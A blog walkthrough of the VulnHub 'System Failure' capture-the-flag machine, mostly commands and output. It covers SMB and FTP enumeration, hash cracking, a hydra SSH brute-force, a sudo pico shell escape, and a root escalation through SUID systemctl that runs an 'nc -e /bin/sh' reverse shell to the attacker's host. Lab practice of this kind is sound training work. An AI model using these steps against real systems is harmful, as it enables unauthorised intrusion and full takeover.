---
layout: post
title:  "VulnHub - System Failure"
date:   2021-03-10 10:10:05 +0300
categories: [vulnhub,walkthrough]
pin: true
tags: [enumeration,guessing,smbmap,enum4linux,hydra,SUID]
---

- Difficulty : Medium

## Nmap
```sh
┌──(alienum㉿kali)-[~]
└─$ nmap 10.0.2.192 -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-06 23:46 EET
Nmap scan report for 10.0.2.192 (10.0.2.192)
Host is up (0.00034s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

## SMBMap
```sh
┌──(alienum㉿kali)-[~]
└─$ smbmap -H 10.0.2.192
[+] IP: 10.0.2.192:445	Name: 10.0.2.192
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ, WRITE	open
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.9.5-Debian)
```

## SMBClient
```sh
┌──(alienum㉿kali)-[~]
└─$ smbclient //10.0.2.192/anonymous -U "guest"
Enter WORKGROUP\guests password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar  6 23:57:16 2021
  ..                                  D        0  Wed Dec 16 16:58:53 2020
  share                               N      220  Thu Dec 17 23:25:14 2020

		7205476 blocks of size 1024. 5394212 blocks available
smb: \> ls
  .                                   D        0  Sat Mar  6 23:57:16 2021
  ..                                  D        0  Wed Dec 16 16:58:53 2020
  share                               N      220  Thu Dec 17 23:25:14 2020

		7205476 blocks of size 1024. 5394212 blocks available
smb: \> mget share
Get file share? y
getting file \share of size 220 as share (17.9 KiloBytes/sec) (average 17.9 KiloBytes/sec)                           N      220  Thu Dec 17 23:25:14 2020
```

## Cat share
```sh
┌──(alienum㉿kali)-[~]
└─$ cat share                                                                                                                                       148 ⨯ 1 ⚙
Guys, I left you access only here to give you my shared file, you have little time, I leave you the login credentials inside for FTP you will find some info, you have to hurry!

89492D216D0A212F8ED54FC5AC9D340B

Admin
```

## Crack Station
```
89492D216D0A212F8ED54FC5AC9D340B --> qazwsxedc
```
## Wget
```sh
wget -r ftp://admin:qazwsxedc@10.0.2.192/
```
## There is a file with different length
```sh
┌──(alienum㉿kali)-[~/Desktop/10.0.2.192/Syst3m/F4iluR3]
└─$ ls -la | grep -v 1696
total 4044
drwxr-xr-x 2 alienum alienum 36864 Mar  7 00:01 .
drwxr-xr-x 3 alienum alienum  4096 Mar  7 00:01 ..
-rw-r--r-- 1 alienum alienum  1714 Dec 20 05:30 file0189.txt
```
## File0189
```sh
super-soldiers-J310MIYla1aVUaSV-
```
## Base62 Decode
```
J310MIYla1aVUaSV --> /Sup3rS3cR37
```
## Gobuster
```sh
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.199  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.bak,.txt,.php.bak,.html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.199
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,bak,txt,php.bak,html
[+] Timeout:        10s
===============================================================
2021/03/09 18:14:45 Starting gobuster
===============================================================
/index.html (Status: 200)
/server-status (Status: 403)
/area4 (Status: 301)
```
## Find important files
```
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.199/area4/Sup3rS3cR37/System/note.txt
Guys, I left something here for you, I know your skills well, we must try to hurry. Not always everything goes the right way.

-Admin
```
## Wget - useful.txt (wordlist)
```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ wget http://10.0.2.199/area4/Sup3rS3cR37/System/useful.txt
```
## enum4linux
```
enum4linux -a -v 10.0.2.199
```
```sh
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\valex (Local User)
S-1-22-1-1001 Unix User\admin (Local User)
S-1-22-1-1002 Unix User\jin (Local User)
S-1-22-1-1003 Unix User\superadmin (Local User)
```
## Hint from note.txt
```
Not always everything goes the right way
```
## Hydra
- flag -u = switching between users
- flag -e r = try reverse login
```
hydra -u -e r -L  users.txt  -P  useful.txt 10.0.2.199 ssh -t 4 -V
```
## Hydra in action
```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ hydra -u -e r -L  users.txt  -P  useful.txt 10.0.2.199 ssh -t 4 -V
[DATA] attacking ssh://10.0.2.199:22/
[22][ssh] host: 10.0.2.199   login: valex   password: xelav
```
## SSH as valex
#### Credentials
```
valex:xelav
```
## User 1
```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ ssh valex@10.0.2.199
valex@10.0.2.199 password: xelav
valex@SystemFailure:~$ ls
user.txt
valex@SystemFailure:~$ cat user.txt
1871828204892bc09be79e1a02607dbf
valex@SystemFailure:~$
```

## Sudo -l
```sh
valex@SystemFailure:~$ sudo -l
User valex may run the following commands on SystemFailure:
  (jin) NOPASSWD: /usr/bin/pico
```
## GTFOBins through Nano
- The /usr/bin/pico call the nano, so GTFOBins through nano
```sh
valex@SystemFailure:~$ sudo -u jin /usr/bin/pico
^R^X
reset; sh 1>&0 2>&0
$ id
uid=1002(jin) gid=1002(jin) groups=1002(jin)
```
## Own Jin
```sh
$ cat user2.txt
172c7b08a7507f08bab7694fd632839e
```
## SUID Permissions
```sh
$ /usr/bin/script -qc /bin/bash /dev/null
jin@SystemFailure:~$ cd /tmp
jin@SystemFailure:/tmp$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/systemctl
...
```
## Creating the Script
```sh
jin@SystemFailure:/tmp$ cat script.sh
nc -e /bin/sh 10.0.2.15 5555
jin@SystemFailure:/tmp$ chmod +x script.sh
jin@SystemFailure:/tmp$
```
## Root
#### GTFOBins - Create a service
- Target
```sh
jin@SystemFailure:~$ TF=$(mktemp).service
jin@SystemFailure:~$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh /tmp/script.sh
> [Install]
> WantedBy=multi-user.target' > $TF
jin@SystemFailure:~$ /usr/bin/systemctl link $TF
Created symlink /etc/systemd/system/tmp.Uc9CDXy2Ol.service → /tmp/tmp.Uc9CDXy2Ol.service.
jin@SystemFailure:~$ /usr/bin/systemctl enable --now $TF
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.Uc9CDXy2Ol.service → /tmp/tmp.Uc9CDXy2Ol.service.
```

- Listener

```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ nc -lvp 5555   
listening on [any] 5555 ...
connect to [10.0.2.15] from 10.0.2.199 [10.0.2.199] 49110
/usr/bin/script -qc /bin/bash /dev/null
root@SystemFailure:/# cd
cd
bash: cd: HOME not set
root@SystemFailure:/# export HOME=/root
export HOME=/root
root@SystemFailure:/# cd
cd
root@SystemFailure:~# ls
ls
root.txt
root@SystemFailure:~# cat root.txt
cat root.txt
If you are reading this flag, without being rooted, it is not valid. You must enter after send me a picture you entered jin, and tag me. Good luck.
root@SystemFailure:~# ls -la
ls -la
total 32
drwx------  4 root root 4096 Dec 20 05:38 .
drwxr-xr-x 18 root root 4096 Dec 16 03:54 ..
lrwxrwxrwx  1 root root    9 Dec 20 05:38 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Dec 16 04:19 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  148 Dec 16 16:04 root.txt
drwxr-xr-x  2 root root 4096 Dec 16 12:28 .rpmdb
-rw-r--r--  1 root root  449 Dec 16 16:30 .SuP3rFin4Lfl4g.txt
root@SystemFailure:~# cat .SuP3rFin4Lfl4g.txt
cat .SuP3rFin4Lfl4g.txt

╔═╗┬ ┬┌─┐┌┬┐┌─┐┌┬┐  ╔═╗┌─┐┬┬  ┬ ┬┬─┐┌─┐
╚═╗└┬┘└─┐ │ ├┤ │││  ╠╣ ├─┤││  │ │├┬┘├┤
╚═╝ ┴ └─┘ ┴ └─┘┴ ┴  ╚  ┴ ┴┴┴─┘└─┘┴└─└─┘

I knew you would succeed.

Oh no.

2527f167fe33658f6b976f3a4ac988dd

Follow me and give feedback on Twitter: 0xJin

L1N5c3QzbUY0aUx1UjIzNTEyNA==
```
